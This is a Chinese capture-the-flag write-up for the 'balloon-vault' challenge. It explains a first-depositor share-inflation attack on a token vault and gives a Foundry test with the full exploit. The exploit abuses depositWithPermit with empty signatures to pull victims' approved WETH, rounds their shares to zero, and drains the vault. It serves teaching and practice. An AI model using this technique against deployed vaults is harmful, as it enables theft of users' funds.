## balloon-vault
这是有关份额操纵的题，只有通过deposit的钱才计算股份，而transfer的不计算，但是transfer的钱影响余额，余额影响股份，所以这就是解题的关键，在这种情况下即使没有transfer函数或者没有receive，fallback函数，我们也可以通过自毁函数来影响余额。

就拿这题的解题逻辑举例了，我们先depositWithPermit 1 wei，此时我们是第一笔交易，余额为0，所以初始化份额为1，然后transfer转入10 ether，也就是10*10^18，这只影响余额

然后vault调用bob depositWithPermit 1 ether，此时份额为 1*10^18 * 1 /10^19 = 0（solidity整数除法向下取整）

调用alice的同理，最后我们独占份额，然后取光钱

###解题
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {WETH} from "../src/5_balloon-vault/WETH.sol";
import {BallonVault} from "../src/5_balloon-vault/Vault.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether);
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge5Test -vvvv //
        ////////////////////////////////////////////////////*/

        weth.deposit{value: 10 ether}();
        
        weth.transfer(attacker, 10 ether);
        
        weth.approve(address(vault), type(uint256).max);
        while (weth.balanceOf(address(attacker)) < 1010 ether) {
            vault.depositWithPermit(attacker, 1 wei, 0, 0, 0, 0);
            weth.transfer(address(vault), weth.balanceOf(address(attacker)));
            vault.depositWithPermit(bob, 1 ether, 0, 0, 0, 0);
            vault.depositWithPermit(alice, 1 ether, 0, 0, 0, 0);
            vault.withdraw(vault.maxWithdraw(attacker), attacker, attacker);
        }


        //==================================================//
        vm.stopPrank();

        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
    }
}

```
